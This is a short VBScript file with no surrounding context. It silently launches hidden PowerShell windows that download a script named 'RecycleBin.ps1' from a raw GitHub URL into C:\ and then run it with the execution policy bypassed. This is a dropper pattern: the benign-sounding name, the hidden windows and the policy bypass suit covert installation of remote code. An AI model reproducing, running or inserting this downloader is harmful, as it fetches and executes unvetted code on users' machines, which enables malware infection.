Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/loneprose02/--/refs/heads/main/RecycleBin.ps1 -OutFile C:\RecycleBin.ps1", 0, True
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\RecycleBin.ps1", 0, True
objShell.Run "powershell.exe exit", 0, False
